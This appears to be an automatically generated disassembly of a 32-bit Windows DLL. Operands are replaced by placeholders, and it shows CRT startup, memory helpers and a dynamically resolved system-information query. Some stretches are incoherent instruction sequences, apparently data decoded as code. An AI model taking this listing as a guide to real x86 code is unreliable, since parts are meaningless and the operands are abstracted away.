cmp ecx 0x5040302
sete al
xor ecx ecx
cmp esi 0x4030201
mov esi [ esp + 0x10 ]
sete cl
and eax ecx
xor edx edx
cmp esi 0x6050403
mov esi [ esp + 0x4 ]
sete dl
and eax edx
xor ecx ecx
cmp esi 0x3020100
sete cl
and eax ecx
and eax 0x1
mov esi eax
mov edx [ rw-data ]
xor eax eax
test edx edx
jbe r-xdata
push rw-data
call sub_1000cfa0
mov esi eax
add esp 0x4
neg esi
sbb esi esi
inc esi
and esi 0x1
cmp esi 0x1
jne r-xdata
mov ecx rw-data
call sub_1000ce40
and esi eax
lea esi [ eax - 0x3 ]
inc eax
mov [ ecx ] esi
add ecx 0x4
cmp eax edx
jb r-xdata
sub_1000ce40
sub esp 0x3c
xor eax eax
mov [ esp + eax ] al
inc eax
cmp eax 0x10
jl r-xdata
push ebx
push esi
push edi
lea eax [ esp + 0x1c ]
push 0x4
push eax
call sub_1000d2e0
lea edx [ esp + eax + 0x24 ]
lea ecx [ esp + 0x24 ]
mov esi edx
or edi 0xffffffff
add esp 0x8
sub esi ecx
xor eax eax
cmp di 0xffff
sete al
xor ecx ecx
cmp edi 0xffffffff
sete cl
and eax ecx
xor ecx ecx
cmp esi 0x4
setl cl
and eax ecx
xor ecx ecx
test esi esi
setge cl
and eax ecx
and eax 0x1
cmp eax 0x1
jne r-xdata
xor esi esi
xor ecx ecx
test esi esi
sete cl
and ecx 0x1
and eax ecx
cmp eax 0x1
jne r-xdata
mov ecx 0x8
pop edi
pop esi
pop ebx
add esp 0x3c
retn
mov ecx 0xa
mov eax edx
mov edi edx
lea ebx [ edx + 0x4 ]
[ edi ]
mov ecx 0x8
xor eax eax
mov edi ebx
[ edi ]
mov esi [ edx ]
mov ecx ebx
cmp esi edx
mov edi 0x8
sete al
and eax 0x1
mov esi eax
and eax 0x1
dec ecx
jne r-xdata
mov ebx [ ecx ]
xor eax eax
test ebx ebx
sete al
and esi eax
add ecx 0x4
dec edi
jne r-xdata
mov edi [ edx + 0x24 ]
xor ecx ecx
cmp edi edx
sete cl
and esi ecx
cmp esi 0x1
jne r-xdata
mov eax esi
lea edx [ esp + 0xd ]
push 0x4
push edx
call sub_1000d2e0
mov ecx eax
add esp 0x8
inc ecx
lea esi [ esp + 0xd ]
lea edx [ esp + ecx + 0xc ]
mov eax edx
and al 0x3
neg al
sbb eax eax
inc eax
cmp edx esi
sbb esi esi
inc esi
and eax esi
cmp ecx 0x5
sbb esi esi
neg esi
and eax esi
cmp ecx 0x1
sbb esi esi
inc esi
and eax esi
lea esi [ esp + 0x11 ]
and eax 0x1
cmp edx esi
sbb esi esi
neg esi
and eax esi
cmp eax 0x1
jne r-xdata
mov edi [ esp + ecx + 0x10 ]
mov ebx [ edx ]
xor esi esi
cmp esi edi
pop edi
sbb ecx ecx
neg ecx
cmp esi ebx
pop esi
sbb edx edx
pop ebx
neg edx
and ecx edx
and eax ecx
add esp 0x3c
retn
sub_1000cfc0
mov eax [ esp + 0x4 ]
mov [ rw-data ] 0x1
test eax eax
je r-xdata
or eax 0xffffffff
retn
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
je r-xdata
mov eax [ esp + 0xc ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x14 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x18 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x1c ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x20 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x24 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
mov eax [ esp + 0x28 ]
cmp eax 0xffffffff
je r-xdata
cmp eax 0x4
jne r-xdata
jmp sub_1000cca0
cmp eax 0x4
jne r-xdata
sub_1000d060
sub esp 0x8
push ebx
xor eax eax
xor ecx ecx
push ebp
mov ebp [ esp + 0x14 ]
xor ebx ebx
push esi
push edi
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] 0x1
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
mov edx eax
shr edx 0x8
and edx 0x1
jmp r-xdata
mov esi 0x1
mov esi [ esp + 0x24 ]
mov dl [ ecx + ebp ]
mov [ ebx + esi ] dl
inc ebx
mov [ esp + 0x10 ] ebx
inc ecx
jmp r-xdata
test edx edx
je r-xdata
xor eax eax
mov al [ ecx + ebp ]
lea edx [ eax + eax + 0x1 ]
mov eax edx
shr eax 0x8
and eax 0x1
inc ecx
mov eax edx
shr eax 0x8
and eax 0x1
jmp r-xdata
add eax eax
test al al
je r-xdata
xor edx edx
mov dl [ ecx + ebp ]
lea eax [ edx + edx + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
mov edx eax
shr edx 0x8
and edx 0x1
jmp r-xdata
lea edi [ eax + esi * 2 ]
lea eax [ edx + edx ]
test al al
je r-xdata
cmp edi 0x2
jne r-xdata
add eax eax
test al al
je r-xdata
test edx edx
jne r-xdata
xor edx edx
add edi 0xfffffd
mov dl [ ecx + ebp ]
mov esi edx
shl edi 0x8
add esi edi
inc ecx
cmp esi 0xffffffff
je r-xdata
mov ebx [ esp + 0x14 ]
add eax eax
test al al
je r-xdata
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
lea esi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
mov edx eax
shr edx 0x8
and edx 0x1
lea esi [ edx + edi * 2 - 0x2 ]
jmp r-xdata
mov eax [ esp + 0x28 ]
pop edi
pop esi
pop ebp
mov [ eax ] ebx
mov eax [ esp + 0x14 ]
cmp ecx eax
pop ebx
jne r-xdata
mov edx esi
not edx
shr esi 0x1
and edx 0x1
inc esi
mov ebx esi
mov [ esp + 0x14 ] ebx
xor edx edx
mov dl [ ecx + ebp ]
lea eax [ edx + edx + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
jmp r-xdata
mov edx eax
shr edx 0x8
and edx 0x1
jmp r-xdata
lea edx [ eax + eax ]
test dl dl
je r-xdata
sbb eax eax
and al 0xfc
add eax 0xffffff37
add esp 0x8
retn
xor eax eax
add esp 0x8
retn
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov esi eax
shr esi 0x8
and esi 0x1
inc ecx
mov esi eax
shr esi 0x8
and esi 0x1
jmp r-xdata
add eax eax
test al al
je r-xdata
mov ebp [ esp + 0x10 ]
mov edx 0x500
cmp edx ebx
mov esi ebp
sbb edx edx
sub esi ebx
neg edx
add edi edx
mov edx [ esp + 0x24 ]
add esi edx
inc ebp
mov bl [ esi ]
inc esi
mov [ edx + ebp - 0x1 ] bl
inc edi
lea edi [ esi + edx * 2 ]
test edi edi
jne r-xdata
mov bl [ esi ]
mov [ edx + ebp ] bl
inc ebp
inc esi
dec edi
jne r-xdata
mov [ esp + 0x10 ] ebp
mov ebp [ esp + 0x1c ]
mov ebx [ esp + 0x10 ]
jmp r-xdata
xor edx edx
mov dl [ ecx + ebp ]
lea edx [ edx + edx + 0x1 ]
mov eax edx
shr eax 0x8
and eax 0x1
inc ecx
mov eax edx
shr eax 0x8
and eax 0x1
jmp r-xdata
xor eax eax
mov al [ ecx + ebp ]
lea eax [ eax + eax + 0x1 ]
mov edx eax
shr edx 0x8
and edx 0x1
inc ecx
mov edx eax
shr edx 0x8
and edx 0x1
jmp r-xdata
lea edi [ eax + edi * 2 ]
lea eax [ edx + edx ]
test al al
je r-xdata
lea edx [ eax + eax ]
test dl dl
je r-xdata
add edi 0x2
test edx edx
je r-xdata
sub_1000d270
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
mov ecx edx
xor eax eax
imul ecx esi
test edx edx
jbe r-xdata
xor eax eax
test esi esi
jbe r-xdata
cmp ecx edx
jb r-xdata
cmp ecx esi
jb r-xdata
cmp ecx 0xffffffff
jae r-xdata
pop esi
retn
push ecx
call [ malloc@IAT ]
add esp 0x4
pop esi
retn
sub_1000d2e0
mov eax [ esp + 0x4 ]
push esi
push eax
call sub_1000d2d0
mov esi [ esp + 0x10 ]
mov ecx eax
xor edx edx
add esp 0x4
lea eax [ ecx + esi - 0x1 ]
div esi
imul eax esi
sub eax ecx
pop esi
retn
sub_1000d330
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_1000d370
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov ecx [ _adjust_fdiv@IAT ]
cmp eax 0x1
mov ecx [ ecx ]
mov [ rw-data ] ecx
jne r-xdata
cmp [ rw-data ] eax
jle r-xdata
test eax eax
jne r-xdata
push 0x80
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
dec [ rw-data ]
push 0x1
pop eax
mov eax [ rw-data ]
test eax eax
je r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
push rw-data
push rw-data
mov [ rw-data ] eax
call _initterm
inc [ rw-data ]
pop ecx
pop ecx
jmp r-xdata
retn 0xc
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
push eax
call [ free@IAT ]
and [ rw-data ] 0x0
pop ecx
pop esi
mov ecx [ esi ]
test ecx ecx
je r-xdata
sub esi 0x4
jmp r-xdata
call ecx
mov eax [ rw-data ]
cmp esi eax
jb r-xdata
_start
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test esi esi
jne r-xdata
cmp esi 0x1
je r-xdata
cmp [ rw-data ] 0x0
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
jne r-xdata
push edi
push esi
push ebx
call sub_1000d370
test eax eax
push edi
push esi
push ebx
call eax
test eax eax
je r-xdata
push edi
push esi
push ebx
call sub_10002109
cmp esi 0x1
mov [ ebp + 0xc ] eax
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test eax eax
jne sub_1000d4ae
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
push esi
push ebx
call sub_1000d370
test eax eax
jne r-xdata
cmp esi 0x3
jne sub_1000d4ae
push edi
push eax
push ebx
call sub_1000d370
cmp [ ebp + 0xc ] 0x0
je sub_1000d4ae
and [ ebp + 0xc ] eax
mov eax [ rw-data ]
test eax eax
je sub_1000d4ae
push edi
push esi
push ebx
call eax
mov [ ebp + 0xc ] eax
sub_1000d4f0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
cmp ebx edi
je r-xdata
xor al al
mov esi [ ebp + 0x10 ]
cmp esi edi
je r-xdata
cmp [ rw-data ] edi
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ ebx ] edi
mov ebx [ ebp + 0x14 ]
mov [ esi ] edi
push rw-data
call [ GetModuleHandleA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
push ebx
push edi
call [ realloc@IAT ]
mov esi eax
pop ecx
test esi esi
pop ecx
je r-xdata
add ebx 0x1400
cmp ebx 0x3e800
ja r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edi esi
push eax
push ebx
push esi
push [ ebp + 0x8 ]
call [ rw-data ]
cmp eax 0xc0000004
jne r-xdata
push edi
test eax eax
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov [ eax ] esi
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
mov al 0x1
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push esi
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
call [ free@IAT ]
pop ecx
sub_10001086
push [ esp + 0xc ]
mov eax [ esp + 0x8 ]
add eax 0x160
push [ esp + 0xc ]
push eax
call sub_1000103b
add esp 0xc
retn
sub_100028b9
push 0x1
pop eax
retn
sub_10002cde
push 0x1
pop eax
retn
sub_10002f24
cmp [ ebp - 0x44 ] ebx
je r-xdata
call sub_10002f61
retn
push [ ebp - 0x44 ]
call [ rw-data ]
mov [ ebp - 0x44 ] ebx
sub_10002f3d
push 0x1
pop eax
retn
sub_10002f61
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
push eax
call [ FreeLibrary@IAT ]
and [ rw-data ] 0x0
sub_100033f6
push 0x1
pop eax
retn
sub_100034a7
cmp [ ebp - 0x1c ] ebx
je r-xdata
retn
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
mov [ ebp - 0x1c ] ebx
sub_100034bc
push 0x1
pop eax
retn
sub_10003580
push 0x1
pop eax
retn
sub_1000374c
push 0x1
pop eax
retn
sub_10003998
push 0x1
pop eax
retn
sub_10003a3a
push 0x1
pop eax
retn
sub_10003bd0
test esi esi
je r-xdata
retn
push esi
call [ free@IAT ]
pop ecx
and [ ebp - 0x1c ] 0x0
sub_10003be3
push 0x1
pop eax
retn
sub_10003eac
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
retn
sub_10003ebb
push 0x1
pop eax
retn
sub_10004033
out dx eax
push cs
push 0x1
pop eax
retn
sub_10004088
fstp [ gs : edx - 0x40 ]
popad
fiadd [ eax ]
mov [ ebp - 0x3c ] 0x5a
mov [ 0x45c64fc5 ] 0xc6
inc edi
mov [ ebp - 0x39 ] 0x27
mov [ ebp - 0x38 ] 0x5a
mov [ ebp - 0x37 ] 0x4f
inc esi
inc ebp
0xc64f
sub_100041bc
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
leave
retn
sub_100041c8
push ebp
mov ebp eax
sub esp 0x10
lea eax [ ecx - 0x10 ]
push eax
call [ GetSystemTime@IAT ]
movzx eax [ 0xffffffff990a6afe ]
pop ecx
idiv cl
mov eax edx
int 0xc3
sub_100043d2
push ebp
sub_10004a6b
mov edi 0x15ff5750
int3
sub_10004d5c
push ebp
mov ebp esp
0xe378687f 0x1000
sub_10004db4
[ ebx ]
sub_10004dc2
push [ esi ]
mov [ ebp - 0x2f6 ] 0x2d
mov [ ebp - 0x20002f5 ] 0x3a
retn 0xca5
sub_10004e0f
jmp [ ebx ]
sub_10005014
push ebp
into
cmp al 0xc6
inc ebp
iretd
sub_10005226
jmp [ ebx ]
sub_1000626b
adc eax r--data
mov ebp eax
lds edi [ ecx ]
retn
sub_10006413
[ edx ]
sub_1000652e
0x58016a0b 0xcbc3
sub_100065cb
push 0x1
pop eax
retn
sub_100066cb
push ebp
mov dl 0x16
retn 0x3345
sub_10006867
cmp [ ebp - 0x38 ] ebx
je r-xdata
cmp [ ebp - 0x6c ] ebx
je r-xdata
push [ ebp - 0x38 ]
call [ FreeLibrary@IAT ]
mov [ ecx - 0x38 ] ebx
or ebp [ edx + 0x1 ]
pop ecx
retn
sub_10006882
mov al 0xe1
add [ eax ] dl
mov [ ebp - 0x6c ] ebx
retn
sub_10006b48
dec ebp
mov esi 0xbf65c61e
adc al dh
inc ebp
rcr [ edx ] 0xc2
inc ebp
sar [ esi ] 0x88
pop ebp
retn 0x45c6
sub_10006b5c
les ecx [ edx ]
mov [ ebp - 0x1b ] 0x11
mov [ ebp - 0x3a ] 0x14
mov [ ebp - 0x39 ] 0x11
mov [ ebp - 0x38 ] 0x10
retn 0xc945
sub_10006b71
or dh al
inc ebp

sub_10006b75
adc [ eax + 0x5d39cb5d ] ecx
adc [ ebp + 0x7 ] dh
mov dl 0xd1
jmp sub_10006c6a
sub_10006c32
push edi
call [ ebp - 0x58 ]
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x1c ] al
0xe45d0803 0x5d8d
sub_10006c50
xor [ ebp - 0x20 ] ecx
je r-xdata
retn
push [ ebp + 0x60 ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x20 ] ebx
sub_10006c64
push 0x1
pop eax
retn
sub_10006c81
add [ esp + 0x4 ] 0xffffff83
clc
or [ edi + 0x43 ] edx
fbld [ eax + 0x12006cd3 ]
mov eax rw-data
retn
sub_10006c9d
mov eax 0x10818164
retn
sub_10006ca3
cmp [ ecx + 0x1 ] ah
add [ eax ] edx
retn
sub_10006cb5
mov eax rw-data
retn
sub_10006cbb
mov eax rw-data
retn
sub_10006cc1
mov eax 0x1011014c
retn
sub_10006cc7
mov eax 0x18010148
retn
sub_10006ccd
mov eax rw-data
retn
sub_10006dd9
push [ ebp - 0x20 ]
[ FreeSid@IAT ]
mov [ ebp - 0x20 ] ebx
retn
sub_10006de6
jmp r-xdata
or [ ecx - 0x4 ] 0xffffffff
or eax [ ebp - 0x1c ]
fwait
dec ebp
sub_10006de8
push 0x3
pop eax
retn
sub_10006df9
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10006f19
call [ eax - 0x1 ]
adc eax wcscmp@IAT
pop ecx
pop ecx
mov edx ecx
neg esi
sbb edi esi
inc esi
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x3 ] edi
call sub_10006f40
retn
sub_10006f36
dec ebp
hlt
sub_10006f40
cmp [ ebp - 0x1a ] ebx
je r-xdata
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
push [ ebp - 0x20 ]
call [ FreeSid@IAT ]
lea ebx [ ebp - 0x18 ]
sub_10006f57
bound eax [ ecx ]
pop eax
retn
sub_10006f66
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x140000 ] ebx
pop edi
pop esi
pop ebx
leave
retn
sub_100071b0
push 0x1
pop eax
retn
sub_100071b4
mov esp [ ebp - 0x18 ]
retn
sub_100071bb
sti
inc [ eax ]
mov [ 0xffffffff83fffc49 ] eax
movsd [ edi ] [ esi ]
dec eax
mov edi 0x4d8bffef
cmc
mov [ fs : 0x40 ] ecx
push edi
ficomp [ ebx - 0x37 ]

sub_10007405
dec [ ecx - 0xb34b ]
jmp edi
sub_1000743f
push 0x1
pop eax
retn
sub_10007443
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffbf
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov [ gs : 0x0 ] ebp
pop edi
pop esi
pop ebx
leave
retn 0xc
sub_100074ee
call [ r--data ]
test eax eax
jne r-xdata
cmp [ edi - 0x1c ] esi
je r-xdata
mov esi [ ebp - 0x24 ]
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x22 ]
jmp sub_1000752b
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
mov [ ebp - 0x3c ] esi
sub_10007578
push ebp
mov ebp esp
sub ebp 0x94
sbb [ eax + eax - 0x72727fff ] al
insb
sub_100075ee
push 0x7f
push [ esp + 0x8 ]
call sub_100075ee
dec ecx
pop ecx
retn
sub_10007606
[ ecx + 0x59 ]
retn
sub_100076d8
adc eax lstrlenA@IAT
inc ebx
retn
sub_10007dee
add al [ eax + 0x57 ]
push 0x3101076c
push edi
salc
push [ ebp + 0xc ]
std
adc eax 0x1004e044

sub_10007ed6
[ edx ]
sub_100084cc
push 0x1
pop eax
retn
sub_100084d0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100085b3
push 0x1
pop eax
retn
sub_100085b7
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100086f3
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_10008700
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_10008723
sub_10008709
push 0x1
pop eax
retn
sub_1000870d
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp sub_10008723
sub_10008723
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008849
mov eax [ ebp - 0x24 ]
add eax 0xc8
push eax
call [ ebp - 0x28 ]
retn
sub_1000885f
push 0x1
pop eax
retn
sub_10008863
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000899f
mov eax [ ebp - 0x24 ]
add eax 0xd8
push eax
call [ ebp - 0x28 ]
retn
sub_100089b5
push 0x1
pop eax
retn
sub_100089b9
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008bec
mov eax [ ebp - 0x24 ]
add eax 0xe0
push eax
call [ ebp - 0x28 ]
retn
sub_10008c02
push 0x1
pop eax
retn
sub_10008c06
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x20 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008e71
push 0x1
pop eax
retn
sub_10008e75
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10008fac
push 0x1
pop eax
retn
sub_10008fb0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_10009146
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000915c
push 0x1
pop eax
retn
sub_10009160
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100092f6
mov eax [ ebp - 0x28 ]
add eax 0xc8
push eax
call [ ebp - 0x2c ]
retn
sub_1000930c
push 0x1
pop eax
retn
sub_10009310
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_100094a6
mov eax [ ebp - 0x28 ]
add eax 0xd8
push eax
call [ ebp - 0x2c ]
retn
sub_100094bc
push 0x1
pop eax
retn
sub_100094c0
mov esp [ ebp - 0x18 ]
mov [ ebp - 0x24 ] 0xffffffe4
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000968f
mov eax [ ebp - 0x28 ]
add eax 0xe0
push eax
call [ ebp - 0x2c ]
retn
sub_100096a5
push 0x1
pop eax
retn
sub_10009ef0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x80 ] eax
push 0x1
pop eax
retn
sub_1000a2b0
push 0x1
pop eax
retn
sub_1000a2b4
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a7ba
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000a891
push 0x1
pop eax
retn
sub_1000a8b5
push 0x1
pop eax
retn
sub_1000a8b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a92c
push 0x1
pop eax
retn
sub_1000a930
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000a9ca
push 0x1
pop eax
retn
sub_1000aa4c
push 0x1
pop eax
retn
sub_1000ab4f
push 0x1
pop eax
retn
sub_1000b0ba
cmp [ ebp - 0x50 ] ebx
je r-xdata
retn
push [ ebp - 0x50 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x50 ] ebx
sub_1000b191
push 0x1
pop eax
retn
sub_1000b1b5
push 0x1
pop eax
retn
sub_1000b1b9
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b22c
push 0x1
pop eax
retn
sub_1000b230
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000b2ca
push 0x1
pop eax
retn
sub_1000b34c
push 0x1
pop eax
retn
sub_1000b44f
push 0x1
pop eax
retn
sub_1000b71d
push 0x1
pop eax
retn
sub_1000b721
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bbf8
cmp [ ebp - 0x54 ] ebx
je r-xdata
retn
push [ ebp - 0x54 ]
call [ FreeLibrary@IAT ]
mov [ ebp - 0x54 ] ebx
sub_1000bc8b
push 0x1
pop eax
retn
sub_1000bc8f
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd02
push 0x1
pop eax
retn
sub_1000bd06
mov esp [ ebp - 0x18 ]
or [ ebp - 0x4 ] 0xffffffff
push 0xffffffd5
pop eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
sub_1000bd7c
push 0x1
pop eax
retn
sub_1000bdfe
push 0x1
pop eax
retn
sub_1000bf8b
push 0x1
pop eax
retn
sub_1000bfb0
push [ ebp - 0x1c ]
call [ FreeLibrary@IAT ]
retn
sub_1000c22c
lea eax [ ebp - 0x2c ]
push eax
call sub_1000c912
pop ecx
retn
sub_1000c360
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000c47d
push [ esp + 0xc ]
push [ esp + 0xc ]
push [ esp + 0xc ]
call sub_1000cab6
add esp 0xc
retn
sub_1000c58a
push 0x1
pop eax
retn
sub_1000c71f
push 0x1
pop eax
retn
sub_1000c7cb
push 0x1
pop eax
retn
sub_1000c9e4
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push [ ebp - 0x1c ]
call [ free@IAT ]
pop ecx
and [ ebp - 0x1c ] 0x0
sub_1000ca73
push 0x1
pop eax
retn
sub_1000cbbe
int 0xfe
htonl
jmp [ htonl@IAT ]
sub_1000ce30
mov eax 0x1
retn
sub_1000cf90
xor eax eax
retn
sub_1000cfa0
mov eax [ esp + 0x4 ]
cmp [ eax ] 0xfffffffd
jne r-xdata
mov eax 0x1
retn
cmp [ eax + 0x4 ] 0xfffffffe
jne r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
xor eax eax
retn
sub_1000d2b0
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
retn
push eax
call [ free@IAT ]
pop ecx
sub_1000d2d0
mov eax [ esp + 0x4 ]
